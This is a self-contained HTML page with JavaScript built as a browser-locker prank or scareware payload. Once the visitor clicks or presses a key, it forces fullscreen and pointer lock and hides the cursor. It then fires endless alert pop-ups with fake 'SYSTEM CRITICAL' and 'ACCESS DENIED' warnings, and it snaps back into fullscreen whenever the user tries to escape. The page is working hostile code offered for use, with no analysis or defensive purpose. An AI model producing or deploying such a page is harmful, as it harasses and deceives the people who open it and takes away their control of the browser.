<!DOCTYPE html>
<html>
<head>
    <title>⚡ INSTANT LOCK ⚡</title>
    <style>
        body { 
            background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; 
            height: 100vh; margin: 0; display: flex; align-items: center; 
            justify-content: center; overflow: hidden; cursor: none;
        }
        h1 { font-size: 3rem; text-shadow: 0 0 20px #f00; text-align: center; }
    </style>
</head>
<body>
    <h1>[ SYSTEM OVERLOAD ]</h1>

    <script>
        function attack() {
            // 1. Instant Fullscreen + Mouse Trap
            document.documentElement.requestFullscreen().catch(() => {});
            document.body.requestPointerLock();

            // 2. The Pop-up Spam
            // We use a tiny timeout so the browser doesn't completely freeze,
            // allowing it to process the Fullscreen request before the next alert.
            setTimeout(() => {
                alert("⚠ SYSTEM CRITICAL ⚠\nRE-LOCKING INTERFACE...");
                alert("⚠ ACCESS DENIED ⚠");
                alert("⚠ FULLSCREEN OVERRIDE ⚠");
                
                // Immediately call itself back
                attack(); 
            }, 1);
        }

        // Trigger on any interaction
        window.onclick = attack;
        window.onkeydown = attack;

        // Force snap-back if they try to escape
        document.onfullscreenchange = () => {
            if (!document.fullscreenElement) {
                attack();
            }
        };
    </script>
</body>
</html>
